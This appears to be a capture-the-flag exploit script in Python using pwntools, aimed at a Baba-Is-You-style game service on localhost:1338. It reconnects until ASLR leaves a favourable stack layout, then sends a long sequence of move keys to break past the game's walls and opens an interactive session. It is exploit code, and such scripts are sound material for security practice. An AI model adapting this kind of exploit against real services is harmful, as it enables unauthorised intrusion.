import pwn
import time
# aslr (baba's addr on stack) 
# must be in favor to teleport outside wall
i = 0
while(i < 20):
    p = pwn.remote("localhost", 1338)
    time.sleep(0.2)
    s = p.recv(40000)
    if (s[0x848:0x84a]==" a"):
        break
    p.close()
    i+=1
moves = "ddddddddddddssssssdassdwwwwwwwwwwwwwddddddsswwwwaaaaasadwawaasdssssssasdwdssswwwwwwwwawwdsddddasdssaaawsddddwwaaaddddddsssssdddddwwasdsaaaaaaaaaasawwwwwsdwssssddddddddddsaaaaaaaasawwwwwwddddsssssddddsaasawwwwwwwdwaaaasddddssssddwaawassssasddddwdssssswwwwwwwaaaaaaaaawwdwwwsssaaaawaassasddddddddddwdssssssasddddwdsswwwwwwaaaaawwwwwwwwwaaassddsssssdddddssdsssssssadwwwwwwwaaaaaaawaaawawwwwsddwassssssssdswwddsadsaswddwaawwwwwwaaaaaaaaawwwwwwwwwddddddwaaaaaawassssssssssssssssssdsawasdddddddssssssssssssssssssssssssssssssdddddddddddddddddddddddddddd"
p.sendline(moves)
p.interactive()